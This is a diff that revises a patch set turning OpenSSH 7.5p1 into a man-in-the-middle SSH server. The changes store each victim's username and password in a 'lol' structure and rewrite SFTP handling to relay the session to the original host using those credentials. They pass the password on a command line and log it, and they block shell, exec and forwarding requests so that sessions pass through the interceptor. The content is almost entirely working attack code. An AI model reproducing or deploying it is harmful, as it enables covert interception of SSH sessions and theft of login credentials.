@@ -1,6 +1,6 @@
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
 --- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2.c	2017-06-28 19:20:35.337729196 -0400
++++ openssh-7.5p1-mitm/auth2.c	2017-07-06 12:52:17.025320184 -0400
 @@ -222,6 +222,10 @@
  		fatal("input_userauth_request: no authctxt");
  
@@ -29,9 +29,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  #endif
  
  #ifdef _UNICOS
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
 --- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2-passwd.c	2017-06-28 19:20:35.337729196 -0400
++++ openssh-7.5p1-mitm/auth2-passwd.c	2017-07-06 12:52:17.025320184 -0400
 @@ -43,9 +43,11 @@
  #include "monitor_wrap.h"
  #include "misc.h"
@@ -58,9 +58,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	if (change)
  		logit("password change not supported");
  	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c
 --- openssh-7.5p1/auth2-pubkey.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-06-28 19:20:35.337729196 -0400
++++ openssh-7.5p1-mitm/auth2-pubkey.c	2017-07-06 12:52:17.025320184 -0400
 @@ -493,7 +493,8 @@
  			_exit(1);
  		}
@@ -71,9 +71,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		error("%s exec \"%s\": %s", tag, command, strerror(errno));
  		_exit(127);
  	default: /* parent */
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
 --- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/auth.c	2017-07-06 12:52:17.025320184 -0400
 @@ -152,6 +152,8 @@
  #ifdef USE_LIBIAF
  		free((void *) passwd);
@@ -83,9 +83,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		if (locked) {
  			logit("User %.100s not allowed because account is locked",
  			    pw->pw_name);
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
 --- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth.h	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/auth.h	2017-07-06 12:52:17.025320184 -0400
 @@ -59,6 +59,7 @@
  	int		 server_caused_failure;
  	int		 force_pwchange;
@@ -94,9 +94,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	char		*service;
  	struct passwd	*pw;		/* set if 'valid' */
  	char		*style;
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
 --- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/auth-passwd.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/auth-passwd.c	2017-07-06 12:52:17.025320184 -0400
 @@ -121,6 +121,8 @@
  	if (options.use_pam)
  		return (sshpam_auth_passwd(authctxt, password) && ok);
@@ -106,9 +106,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
  	if (!expire_checked) {
  		expire_checked = 1;
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
 --- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/channels.c	2017-07-06 12:52:17.025320184 -0400
 @@ -191,6 +191,40 @@
  static int connect_next(struct channel_connect *);
  static void channel_connect_ctx_free(struct channel_connect *);
@@ -181,9 +181,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  		len = write(c->wfd, buf, dlen);
  		if (len < 0 &&
  		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
 --- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/channels.h	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/channels.h	2017-07-06 12:52:17.025320184 -0400
 @@ -100,6 +100,7 @@
  	u_int   istate;		/* input from channel (state of receive half) */
  	u_int   ostate;		/* output to channel  (state of transmit half) */
@@ -201,9 +201,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  void	 channel_free(Channel *);
  void	 channel_free_all(void);
  void	 channel_stop_listening(void);
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
 --- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/clientloop.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/clientloop.c	2017-07-06 12:52:17.025320184 -0400
 @@ -1752,7 +1752,10 @@
  	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
  		snprintf(buf, sizeof buf,
@@ -216,9 +216,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	}
  
  	/* Output any buffered data for stdout. */
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/loginrec.c openssh-7.5p1-mitm/loginrec.c
 --- openssh-7.5p1/loginrec.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/loginrec.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/loginrec.c	2017-07-06 12:52:17.025320184 -0400
 @@ -435,6 +435,8 @@
  int
  login_write(struct logininfo *li)
@@ -228,9 +228,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  #ifndef HAVE_CYGWIN
  	if (geteuid() != 0) {
  		logit("Attempt to write login records by non-root user (aborting)");
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
 --- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
-+++ openssh-7.5p1-mitm/lol.h	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/lol.h	2017-07-06 14:12:43.694888553 -0400
 @@ -0,0 +1,25 @@
 +#ifndef LOL_H
 +#define LOL_H
@@ -257,9 +257,41 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
 +typedef struct _Lol Lol;
 +
 +#endif /* LOL_H */
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/Makefile.in openssh-7.5p1-mitm/Makefile.in
+--- openssh-7.5p1/Makefile.in	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/Makefile.in	2017-07-11 16:00:22.173709516 -0400
+@@ -23,7 +23,7 @@
+ VPATH=@srcdir@
+ SSH_PROGRAM=@bindir@/ssh
+ ASKPASS_PROGRAM=$(libexecdir)/ssh-askpass
+-SFTP_SERVER=$(libexecdir)/sftp-server
++SFTP_SERVER=/home/ssh-mitm/bin/sftp-server
+ SSH_KEYSIGN=$(libexecdir)/ssh-keysign
+ SSH_PKCS11_HELPER=$(libexecdir)/ssh-pkcs11-helper
+ PRIVSEP_PATH=@PRIVSEP_PATH@
+@@ -107,7 +107,7 @@
+ 	monitor.o monitor_wrap.o auth-krb5.o \
+ 	auth2-gss.o gss-serv.o gss-serv-krb5.o \
+ 	loginrec.o auth-pam.o auth-shadow.o auth-sia.o md5crypt.o \
+-	sftp-server.o sftp-common.o \
++	sftp-server.o sftp-client.o sftp-common.o \
+ 	sandbox-null.o sandbox-rlimit.o sandbox-systrace.o sandbox-darwin.o \
+ 	sandbox-seccomp-filter.o sandbox-capsicum.o sandbox-pledge.o \
+ 	sandbox-solaris.o
+@@ -187,8 +187,8 @@
+ ssh-keyscan$(EXEEXT): $(LIBCOMPAT) libssh.a ssh-keyscan.o
+ 	$(LD) -o $@ ssh-keyscan.o $(LDFLAGS) -lssh -lopenbsd-compat -lssh $(LIBS)
+ 
+-sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-common.o sftp-server.o sftp-server-main.o
+-	$(LD) -o $@ sftp-server.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
++sftp-server$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-server.o sftp-server-main.o
++	$(LD) -o $@ sftp-server.o sftp-client.o sftp-common.o sftp-server-main.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS)
+ 
+ sftp$(EXEEXT): $(LIBCOMPAT) libssh.a sftp.o sftp-client.o sftp-common.o sftp-glob.o progressmeter.o
+ 	$(LD) -o $@ progressmeter.o sftp.o sftp-client.o sftp-common.o sftp-glob.o $(LDFLAGS) -lssh -lopenbsd-compat $(LIBS) $(LIBEDIT)
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
 --- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.c	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/monitor.c	2017-07-06 12:52:17.025320184 -0400
 @@ -119,6 +119,7 @@
  
  /* State exported from the child */
@@ -335,9 +367,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  /* XXX */
  
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
 --- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor.h	2017-06-28 19:20:35.341729196 -0400
++++ openssh-7.5p1-mitm/monitor.h	2017-07-06 12:52:17.025320184 -0400
 @@ -56,6 +56,7 @@
  	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
  	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
@@ -346,9 +378,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  	MONITOR_REQ_PAM_START = 100,
  	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
 --- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.c	2017-07-06 12:52:17.025320184 -0400
 @@ -482,6 +482,31 @@
  	sshbuf_free(m);
  }
@@ -381,9 +413,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  int
  mm_pty_allocate(int *ptyfd, int *ttyfd, char *namebuf, size_t namebuflen)
  {
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
 --- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/monitor_wrap.h	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.h	2017-07-06 12:52:17.025320184 -0400
 @@ -28,6 +28,8 @@
  #ifndef _MM_WRAP_H_
  #define _MM_WRAP_H_
@@ -405,9 +437,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  /* bsdauth */
  int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
 --- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/session.c	2017-06-28 19:20:35.345729196 -0400
++++ openssh-7.5p1-mitm/session.c	2017-07-12 12:11:11.835051134 -0400
 @@ -112,7 +112,7 @@
  /* func */
  
@@ -517,16 +549,24 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  #ifdef PASSWD_NEEDS_USERNAME
  		execl(_PATH_PASSWD_PROG, "passwd", s->pw->pw_name,
  		    (char *)NULL);
-@@ -1628,6 +1659,8 @@
+@@ -1628,9 +1659,14 @@
  #ifdef WITH_SELINUX
  		ssh_selinux_change_context("sftpd_t");
  #endif
-+		/* Disable SFTP. */
-+		exit(1);
- 		exit(sftp_server_main(i, argv, s->pw));
+-		exit(sftp_server_main(i, argv, s->pw));
++		exit(sftp_server_main(i, argv, s->pw,
++#ifdef DEBUG_HOST
++					DEBUG_HOST, DEBUG_PORT,
++#else
++					lol->original_host, lol->original_port,
++#endif
++					lol->username, lol->password));
  	}
+-
+ 	fflush(NULL);
  
-@@ -1646,6 +1679,11 @@
+ 	/* Get the last component of the shell name. */
+@@ -1646,6 +1682,11 @@
  	 */
  	if (!command) {
  		char argv0[256];
@@ -538,7 +578,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  		/* Start the shell.  Set initial character to '-'. */
  		argv0[0] = '-';
-@@ -1658,9 +1696,33 @@
+@@ -1658,9 +1699,33 @@
  		}
  
  		/* Execute the shell. */
@@ -574,32 +614,60 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  
  		/* Executing the shell failed. */
  		perror(shell);
-@@ -1674,8 +1736,9 @@
+@@ -1672,7 +1737,39 @@
+ 	 */
+ 	argv[0] = (char *) shell0;
  	argv[1] = "-c";
- 	argv[2] = (char *) command;
- 	argv[3] = NULL;
--	execve(shell, argv, env);
--	perror(shell);
-+	/* This should never be reached, but just in case... do not execute any command here. */
-+	/*execve(shell, argv, env);
-+        perror(shell);*/
- 	exit(1);
- }
- 
-@@ -1922,6 +1985,12 @@
- 	char *prog, *cmd;
- 	u_int i;
- 
-+	/* Disable subsystems. */
-+	char *subsystem = packet_get_string(&len);
-+	logit("MITM: rejecting subsystem request: %.100s", subsystem);
-+	free(subsystem);
-+	return 0;
+-	argv[2] = (char *) command;
 +
- 	s->subsys = packet_get_string(&len);
- 	packet_check_eom();
++	if (strcmp(command, _PATH_SFTP_SERVER) != 0) {
++		logit("MITM: attempted to exec %s, but forcing it to %s instead.", command, _PATH_SFTP_SERVER);
++		command = _PATH_SFTP_SERVER;
++	}
++
++	size_t new_command_size = strlen(command) + strlen(lol->original_host) + 16 + strlen(lol->username) + strlen(lol->password) + 4 + 1;
++#ifdef DEBUG_HOST
++#define SFTP_LOG_ARGS " -f AUTH -l DEBUG3"
++	new_command_size += sizeof(SFTP_LOG_ARGS);
++#endif
++
++	char *new_command = calloc(new_command_size, sizeof(char *));
++	strlcpy(new_command, command, new_command_size);
++	strlcat(new_command, " ", new_command_size);
++	strlcat(new_command, lol->original_host, new_command_size);
++	strlcat(new_command, " ", new_command_size);
++
++	char port_str[16];
++	snprintf(port_str, sizeof(port_str), "%u", lol->original_port);
++
++	strlcat(new_command, port_str, new_command_size);
++	strlcat(new_command, " ", new_command_size);
++	strlcat(new_command, lol->username, new_command_size);
++	strlcat(new_command, " ", new_command_size);
++	strlcat(new_command, lol->password, new_command_size);
++
++#ifdef DEBUG_HOST
++	strlcat(new_command, SFTP_LOG_ARGS, new_command_size);	
++#endif
++
++	logit("MITM: SFTP command: %s", new_command);
++	argv[2] = (char *) new_command;
+ 	argv[3] = NULL;
+ 	execve(shell, argv, env);
+ 	perror(shell);
+@@ -1927,6 +2024,11 @@
  	debug2("subsystem request for %.100s by user %s", s->subsys,
-@@ -1958,6 +2027,10 @@
+ 	    s->pw->pw_name);
+ 
++	if (strcmp(s->subsys, "sftp") != 0) {
++		logit("MITM: subsystem request for something other than sftp (%.100s).  Rejecting...", s->subsys);
++		return 0;
++        }
++
+ 	for (i = 0; i < options.num_subsystems; i++) {
+ 		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
+ 			prog = options.subsystem_command[i];
+@@ -1958,6 +2060,10 @@
  {
  	int success;
  
@@ -610,21 +678,20 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	if (s->auth_proto != NULL || s->auth_data != NULL) {
  		error("session_x11_req: session %d: "
  		    "x11 forwarding already active", s->self);
-@@ -1999,6 +2072,13 @@
+@@ -1999,6 +2105,12 @@
  
  	char *command = packet_get_string(&len);
  	packet_check_eom();
 +
 +	/* Disable exec. */
-+	if (command == NULL) command = "";
-+	logit("MITM: rejecting exec request: [%s]", command);
++	logit("MITM: rejecting exec request: [%s]", command == NULL ? "(NULL)" : command);
 +	free(command);
 +	return 0;
 +
  	success = do_exec(s, command) == 0;
  	free(command);
  	return success;
-@@ -2022,6 +2102,10 @@
+@@ -2022,6 +2134,10 @@
  	char *name, *val;
  	u_int name_len, val_len, i;
  
@@ -635,7 +702,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	name = packet_get_cstring(&name_len);
  	val = packet_get_cstring(&val_len);
  	packet_check_eom();
-@@ -2056,6 +2140,11 @@
+@@ -2056,6 +2172,11 @@
  {
  	static int called = 0;
  	packet_check_eom();
@@ -647,7 +714,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
  		debug("session_auth_agent_req: no_agent_forwarding_flag");
  		return 0;
-@@ -2113,7 +2202,7 @@
+@@ -2113,7 +2234,7 @@
  
  void
  session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
@@ -656,7 +723,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  {
  	/*
  	 * now that have a child and a pipe to the child,
-@@ -2124,7 +2213,7 @@
+@@ -2124,7 +2245,7 @@
  	channel_set_fds(s->chanid,
  	    fdout, fdin, fderr,
  	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
@@ -665,9 +732,1771 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd
  }
  
  /*
-diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c
+--- openssh-7.5p1/sftp.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp.c	2017-07-07 16:36:10.300366487 -0400
+@@ -579,9 +579,10 @@
+ remote_is_dir(struct sftp_conn *conn, const char *path)
+ {
+ 	Attrib *a;
++	u_int status;
+ 
+ 	/* XXX: report errors? */
+-	if ((a = do_stat(conn, path, 1)) == NULL)
++	if ((a = do_stat(conn, path, 1, &status)) == NULL)
+ 		return(0);
+ 	if (!(a->flags & SSH2_FILEXFER_ATTR_PERMISSIONS))
+ 		return(0);
+@@ -1504,7 +1505,8 @@
+ 			err = 1;
+ 			break;
+ 		}
+-		if ((aa = do_stat(conn, tmp, 0)) == NULL) {
++		u_int status;
++		if ((aa = do_stat(conn, tmp, 0, &status)) == NULL) {
+ 			free(tmp);
+ 			err = 1;
+ 			break;
+@@ -1593,7 +1595,8 @@
+ 		path1 = make_absolute(path1, *pwd);
+ 		remote_glob(conn, path1, GLOB_NOCHECK, NULL, &g);
+ 		for (i = 0; g.gl_pathv[i] && !interrupted; i++) {
+-			if (!(aa = do_stat(conn, g.gl_pathv[i], 0))) {
++			u_int status;
++			if (!(aa = do_stat(conn, g.gl_pathv[i], 0, &status))) {
+ 				if (err_abort) {
+ 					err = -1;
+ 					break;
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.c openssh-7.5p1-mitm/sftp-client.c
+--- openssh-7.5p1/sftp-client.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sftp-client.c	2017-07-12 12:17:14.159320238 -0400
+@@ -74,6 +74,7 @@
+ # define SFTP_DIRECTORY_CHARS      "/"
+ #endif /* HAVE_CYGWIN */
+ 
++/*
+ struct sftp_conn {
+ 	int fd_in;
+ 	int fd_out;
+@@ -90,10 +91,13 @@
+ 	u_int64_t limit_kbps;
+ 	struct bwlimit bwlimit_in, bwlimit_out;
+ };
++*/
++struct sftp_conn *client_conn = NULL;
++
+ 
+ static u_char *
+-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
+-    const char *errfmt, ...) __attribute__((format(printf, 4, 5)));
++get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
++    const char *errfmt, ...) __attribute__((format(printf, 5, 6)));
+ 
+ /* ARGSUSED */
+ static int
+@@ -231,11 +235,11 @@
+ }
+ 
+ static u_char *
+-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,
++get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,
+     const char *errfmt, ...)
+ {
+ 	struct sshbuf *msg;
+-	u_int id, status;
++	u_int id;
+ 	u_char type;
+ 	u_char *handle;
+ 	char errmsg[256];
+@@ -258,10 +262,10 @@
+ 		fatal("%s: ID mismatch (%u != %u)",
+ 		    errfmt == NULL ? __func__ : errmsg, id, expected_id);
+ 	if (type == SSH2_FXP_STATUS) {
+-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
++		if ((r = sshbuf_get_u32(msg, status)) != 0)
+ 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 		if (errfmt != NULL)
+-			error("%s: %s", errmsg, fx2txt(status));
++			error("%s: %s", errmsg, fx2txt(*status));
+ 		sshbuf_free(msg);
+ 		return(NULL);
+ 	} else if (type != SSH2_FXP_HANDLE)
+@@ -276,7 +280,7 @@
+ }
+ 
+ static Attrib *
+-get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet)
++get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet, u_int *status)
+ {
+ 	struct sshbuf *msg;
+ 	u_int id;
+@@ -296,14 +300,13 @@
+ 	if (id != expected_id)
+ 		fatal("ID mismatch (%u != %u)", id, expected_id);
+ 	if (type == SSH2_FXP_STATUS) {
+-		u_int status;
+ 
+-		if ((r = sshbuf_get_u32(msg, &status)) != 0)
++		if ((r = sshbuf_get_u32(msg, status)) != 0)
+ 			fatal("%s: buffer error: %s", __func__, ssh_err(r));
+ 		if (quiet)
+-			debug("Couldn't stat remote file: %s", fx2txt(status));
++			debug("Couldn't stat remote file: %s", fx2txt(*status));
+ 		else
+-			error("Couldn't stat remote file: %s", fx2txt(status));
++			error("Couldn't stat remote file: %s", fx2txt(*status));
+ 		sshbuf_free(msg);
+ 		return(NULL);
